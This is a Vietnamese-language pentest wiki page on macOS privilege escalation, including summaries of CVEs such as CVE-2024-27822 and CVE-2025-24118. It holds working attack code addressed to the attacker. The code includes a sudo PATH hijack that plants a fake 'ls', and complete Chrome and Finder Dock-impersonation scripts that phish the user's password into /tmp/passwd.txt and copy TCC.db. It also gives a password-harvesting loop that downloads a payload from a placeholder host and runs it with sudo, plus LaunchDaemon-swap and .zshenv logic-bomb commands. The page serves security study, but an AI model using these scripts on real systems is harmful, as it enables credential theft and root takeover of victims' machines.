# Leo thang đặc quyền macOS

{{#include ../../banners/hacktricks-training.md}}

## Leo thang đặc quyền TCC

Nếu bạn đến đây để tìm hiểu về leo thang đặc quyền TCC, hãy xem:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Nhiều kỹ thuật leo thang đặc quyền ảnh hưởng đến Linux hoặc các hệ thống tương tự Unix cũng áp dụng cho macOS. Xem:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## Tương tác với người dùng

### Sudo Hijacking

Bạn có thể tìm thấy [kỹ thuật Sudo Hijacking gốc trong bài viết Leo thang đặc quyền Linux](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking).

Tuy nhiên, macOS **giữ nguyên** **`PATH`** của người dùng khi họ chạy **`sudo`**. Điều đó có nghĩa là một cách khác để thực hiện cuộc tấn công này là **chiếm quyền các binary khác** mà nạn nhân vẫn chạy khi **dùng sudo:**

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

Lưu ý rằng người dùng sử dụng terminal rất có thể đã **cài Homebrew**. Vì vậy, có thể chiếm quyền các binary trong **`/opt/homebrew/bin`**.

### Giả mạo Dock

Bằng cách sử dụng một số thủ thuật **social engineering**, bạn có thể **giả mạo**, chẳng hạn như Google Chrome, trong Dock và thực thi script của riêng mình:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Một số gợi ý:

- Kiểm tra Dock xem có Chrome hay không. Nếu có, hãy **xóa** mục đó rồi **thêm** mục Chrome **giả mạo** vào cùng vị trí trong mảng Dock.

<details>
<summary>Script giả mạo Chrome trong Dock</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Một số gợi ý:

- Bạn **không thể xóa Finder khỏi Dock**, vì vậy nếu định thêm nó vào Dock, bạn có thể đặt Finder giả ngay cạnh Finder thật. Để làm vậy, bạn cần **thêm mục Finder giả vào đầu mảng Dock**.
- Một lựa chọn khác là không đặt nó trong Dock mà chỉ mở nó; việc “Finder yêu cầu điều khiển Finder” cũng không quá kỳ lạ.
- Một lựa chọn khác để **leo thang lên root mà không hỏi** mật khẩu bằng một hộp thoại đáng sợ là khiến Finder thực sự yêu cầu mật khẩu để thực hiện một hành động cần quyền đặc biệt:
  - Yêu cầu Finder sao chép một tệp **`sudo`** mới vào **`/etc/pam.d`** (Lời nhắc yêu cầu mật khẩu sẽ cho biết “Finder muốn sao chép sudo”)
  - Yêu cầu Finder sao chép một **Authorization Plugin** mới (Bạn có thể kiểm soát tên tệp để lời nhắc yêu cầu mật khẩu sẽ cho biết “Finder muốn sao chép Finder.bundle”)

<details>
<summary>Finder Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### Lừa đảo qua lời nhắc mật khẩu + tái sử dụng sudo

Malware thường lợi dụng tương tác của người dùng để **thu thập mật khẩu có thể dùng với sudo** rồi tái sử dụng bằng chương trình. Một quy trình phổ biến:

1. Xác định người dùng đang đăng nhập bằng `whoami`.
2. **Lặp lại lời nhắc mật khẩu** cho đến khi `dscl . -authonly "$user" "$pw"` trả về thành công.
3. Lưu thông tin xác thực vào bộ nhớ đệm (ví dụ: `/tmp/.pass`) và thực hiện các hành động cần quyền cao bằng `sudo -S` (nhập mật khẩu qua stdin).

Ví dụ về chuỗi lệnh tối giản:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

Mật khẩu bị đánh cắp sau đó có thể được dùng lại để **xóa trạng thái cách ly của Gatekeeper bằng `xattr -c`**, sao chép LaunchDaemons hoặc các tệp đặc quyền khác, và chạy thêm các giai đoạn mà không cần tương tác.<sup>[[1]](#references)</sup>

#### Xác thực mật khẩu thu thập được thông qua PAM

Một hộp thoại yêu cầu mật khẩu dạng văn bản bảo mật trông như giao diện gốc có thể thu thập mật khẩu tài khoản cần kiểm tra và xác thực ngay trong tiến trình thông qua PAM, thay vì khởi chạy `dscl`, `security` hoặc `osascript`. Ứng dụng gọi bắt đầu một giao dịch PAM bằng `pam_start`, cung cấp mật khẩu cần kiểm tra thông qua callback hội thoại, gọi `pam_authenticate`, rồi kết thúc giao dịch bằng `pam_end`. Nếu kiểm tra thất bại, ứng dụng có thể quay lại trường nhập mật khẩu; nếu thành công, mật khẩu được xác nhận mà không cần khởi chạy một tiến trình xác minh riêng. Chỉ riêng việc xác thực PAM **không** nâng quyền cho ứng dụng gọi hoặc cho phép thực hiện các thao tác đặc quyền.<sup>[[9]](#references)[[10]](#references)</sup>

Nếu mật khẩu đăng nhập trùng với mật khẩu Keychain, mật khẩu thu thập được cũng có thể dùng cho các thao tác yêu cầu mật khẩu Keychain hiện tại; xem [các ràng buộc về ACL và danh sách phân vùng của Keychain](../macos-red-teaming/macos-keychain.md).<sup>[[10]](#references)</sup>

## Các vector đặc thù của macOS phiên bản mới hơn (2023–2026)

### `AuthorizationExecuteWithPrivileges` đã lỗi thời nhưng vẫn dùng được

`AuthorizationExecuteWithPrivileges` đã bị đánh dấu lỗi thời từ phiên bản 10.7 nhưng **vẫn hoạt động trên Sonoma/Sequoia**. Nhiều trình cập nhật thương mại gọi `/usr/libexec/security_authtrampoline` với một đường dẫn không đáng tin cậy. Nếu người dùng có thể ghi vào tệp nhị phân đích, bạn có thể cài trojan và lợi dụng lời nhắc hợp lệ:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

Kết hợp với **các thủ thuật giả mạo ở trên** để hiển thị một hộp thoại mật khẩu đáng tin.

### Phân loại nhanh helper có đặc quyền / XPC

Nhiều lỗi macOS privesc của bên thứ ba hiện đại theo cùng một mô hình: một **LaunchDaemon chạy với quyền root** cung cấp **dịch vụ Mach/XPC** từ **`/Library/PrivilegedHelperTools`**, sau đó helper không xác thực client, xác thực **quá muộn** (race PID), hoặc cung cấp một **phương thức root** xử lý **đường dẫn/script do người dùng kiểm soát**. Đây là loại lỗi đứng sau nhiều lỗi helper gần đây trong các client VPN, game launcher và trình cập nhật.<sup>[[2]](#references)</sup>

Danh sách kiểm tra phân loại nhanh:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

Đặc biệt chú ý đến các helper:

- vẫn tiếp tục chấp nhận yêu cầu **sau khi gỡ cài đặt** vì job vẫn được tải trong `launchd`
- thực thi script hoặc đọc cấu hình từ **`/Applications/...`** hay các đường dẫn khác mà người dùng không phải root có thể ghi
- dựa vào việc xác thực peer **chỉ bằng PID** hoặc **chỉ bằng bundle-id**, vốn có thể bị khai thác race condition

Để biết thêm chi tiết về các lỗi authorization của helper, hãy xem [trang này](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Kế thừa môi trường script của PackageKit (CVE-2024-27822)

Trước khi Apple khắc phục lỗi này trong **Sonoma 14.5**, **Ventura 13.6.7** và **Monterey 12.7.5**, các lần cài đặt do người dùng khởi chạy thông qua **`Installer.app`** / **`PackageKit.framework`** có thể thực thi **script PKG với quyền root trong môi trường của người dùng hiện tại**. Điều đó có nghĩa là một package sử dụng **`#!/bin/zsh`** sẽ tải **`~/.zshenv`** của attacker và chạy tệp đó với quyền **root** khi victim cài đặt package.<sup>[[3]](#references)</sup>

Điều này đặc biệt đáng chú ý dưới dạng **logic bomb**: bạn chỉ cần foothold trong tài khoản người dùng cùng một tệp khởi động shell có thể ghi, sau đó chờ người dùng chạy bất kỳ trình cài đặt nào dựa trên **zsh** có lỗ hổng. Điều này nhìn chung **không** áp dụng cho các đợt triển khai **MDM/Munki**, vì chúng chạy trong môi trường của người dùng root.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

Nếu muốn tìm hiểu sâu hơn về việc lạm dụng installer, hãy xem thêm [trang này](macos-files-folders-and-binaries/macos-installers-abuse.md).

### Va chạm đích của Installer qua `.localized`

Một số installer bên thứ ba đăng ký LaunchDaemon cấp root, với executable được tham chiếu bằng một đường dẫn cố định bên trong `/Applications/Target.app`. Nếu kẻ tấn công có thể tạo bundle đó trước bằng **một bundle identifier khác**, Installer có thể giữ lại bundle mồi nhử và đặt ứng dụng thật tại `/Applications/Target.localized/Target.app`. Daemon vẫn trỏ đến đường dẫn ban đầu. Vì vậy, executable do kẻ tấn công kiểm soát bên trong bundle mồi nhử có thể chạy với quyền root sau đó.<sup>[[8]](#references)</sup>

Các điều kiện tiên quyết quan trọng là:<sup>[[8]](#references)</sup>

1. Kẻ tấn công có thể tạo hoặc kiểm soát đường dẫn ứng dụng dự kiến.
2. Package không xóa bundle xung đột.
3. Job có đặc quyền sử dụng đường dẫn hard-code bên trong bundle đó.
4. Người dùng hoặc quy trình MDM cài đặt package và đăng ký job.

Tìm các bundle đã được di chuyển, sau đó kiểm tra các đích LaunchDaemon bằng vòng lặp liệt kê ở phần tiếp theo:<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

Một installer an toàn hơn sẽ xác định vị trí bundle cuối cùng và đặt các executable có đặc quyền tại vị trí do root sở hữu, chẳng hạn như `/Library/PrivilegedHelperTools`. Installer cũng nên xác minh quyền sở hữu và chữ ký mã trước khi đăng ký hoặc khởi chạy job.<sup>[[8]](#references)</sup>

### Hijack mục tiêu LaunchDaemon có thể ghi

Một plist của LaunchDaemon có thể do root sở hữu, nhưng `Program` hoặc mục đầu tiên trong `ProgramArguments` lại trỏ đến một thư mục mà người dùng có quyền ghi. Hãy kiểm tra **toàn bộ đường dẫn**, không chỉ quyền của executable. Nếu thư mục cha có quyền ghi, kẻ tấn công có thể đổi tên executable do root sở hữu rồi tạo một bản thay thế tại cùng đường dẫn. Bản thay thế sẽ chạy với quyền root khi job khởi chạy lần tiếp theo. Chỉ cần khởi động lại hoặc khởi động lại dịch vụ như bình thường. Kẻ tấn công không cần quyền chạy `launchctl bootstrap` trong system domain.<sup>[[7]](#references)</sup>

Trước tiên, liệt kê từng mục tiêu và thư mục cha trực tiếp của nó:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

Khi tệp hoặc thư mục cha có quyền ghi, giữ lại binary gốc rồi thay đường dẫn bằng một payload thực thi. Sau đó chờ daemon đã được tải sẵn khởi động lại.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR race con trỏ credential (CVE-2025-24118)

Đường dẫn dễ bị tấn công `kauth_cred_proc_update` cập nhật `proc_ro.p_ucred` bằng API không nguyên tử `zalloc_ro_mut`, trong khi các trình đọc SMR tải con trỏ mà không khóa. Cách kích hoạt công khai sử dụng một binary setgid được chuẩn bị đặc biệt. Một thread chuyển đổi giữa group ID thực và hiệu lực của nó, trong khi một thread khác liên tục gọi syscall như `getgid()`.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

Coi đây là một **primitive cho race condition**, không phải exploit root hoàn chỉnh. PoC được công bố cho thấy một con trỏ credential bị xé. Lỗi này thường gây kernel panic. Nhà nghiên cứu chỉ tái hiện được tình trạng hỏng dữ liệu trên Intel và không chứng minh được khả năng kiểm soát có tính xác định đối với đối tượng credential phát sinh. Apple đã thay đổi thao tác cập nhật thành trao đổi con trỏ nguyên tử trong macOS 15.3.<sup>[[4]](#references)</sup>

### Vượt qua SIP qua Migration Assistant ("Migraine", CVE-2023-32369)

Ngay cả khi đã có root, SIP vẫn chặn việc ghi vào các vị trí hệ thống. Lỗi **Migraine** lợi dụng entitlement của Migration Assistant `com.apple.rootless.install.heritable` để tạo một tiến trình con kế thừa khả năng vượt qua SIP và ghi đè các đường dẫn được bảo vệ (ví dụ: `/System/Library/LaunchDaemons`).<sup>[[5]](#references)</sup> Chuỗi khai thác:

1. Có được root trên hệ thống đang hoạt động.
2. Kích hoạt `systemmigrationd` bằng trạng thái được tạo thủ công để chạy một binary do kẻ tấn công kiểm soát.
3. Dùng entitlement được kế thừa để vá các tệp được SIP bảo vệ; thay đổi vẫn tồn tại sau khi khởi động lại.

### Lén đưa biểu thức NSPredicate/XPC vào (nhóm lỗi CVE-2023-23530/23531)

Nhiều daemon của Apple chấp nhận đối tượng **NSPredicate** qua XPC nhưng chỉ xác thực trường `expressionType`, vốn do kẻ tấn công kiểm soát. Bằng cách tạo predicate thực thi các selector tùy ý, bạn có thể đạt được **thực thi mã trong các dịch vụ XPC root/system** (ví dụ: `coreduetd`, `contextstored`). Khi kết hợp với việc thoát khỏi sandbox của ứng dụng ban đầu, điều này cho phép **leo thang đặc quyền mà không cần lời nhắc người dùng**. Hãy tìm các endpoint XPC giải tuần tự predicate nhưng không có visitor đủ mạnh.<sup>[[6]](#references)</sup>

## TCC - Leo thang đặc quyền root

### CVE-2020-9771 - Vượt qua TCC và leo thang đặc quyền qua mount_apfs

**Bất kỳ người dùng nào** (kể cả người dùng không có đặc quyền) đều có thể tạo và mount snapshot Time Machine bằng `-o noowners` rồi **truy cập TẤT CẢ các tệp** trong snapshot đó, qua mặt các bước kiểm tra quyền sở hữu trên volume đang hoạt động. Đặc quyền duy nhất cần có là ứng dụng được sử dụng (chẳng hạn như `Terminal`) phải có **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`).

Các lệnh và phần giải thích đầy đủ có trên trang TCC bypasses:

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## Thông tin nhạy cảm

Thông tin này có thể hữu ích khi leo thang đặc quyền:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}

## References

- [1] [Pentest Partners - 2025, năm của Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: Leo thang đặc quyền cục bộ qua AWS Client VPN cho macOS](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: Leo thang đặc quyền qua macOS PackageKit](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" - Vượt qua SIP (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trung tâm Nghiên cứu Tiên tiến Trellix - Một nhóm lỗi leo thang đặc quyền mới trên macOS và iOS (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [Chiếm quyền LaunchDaemon: leo thang đặc quyền và duy trì quyền truy cập qua quyền thư mục không an toàn](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [LPE trên macOS qua thư mục .localized](https://theevilbit.github.io/posts/localized/)
- [9] [Jamf Threat Labs - PamStealer: malware macOS giả dạng ứng dụng quản lý clipboard](https://www.jamf.com/blog/pamstealer-macos-infostealer-applescript-rust/)
- [10] [Kaspersky Securelist - Phân tích chi tiết MacSync](https://securelist.com/macsync-new-version/121383/)
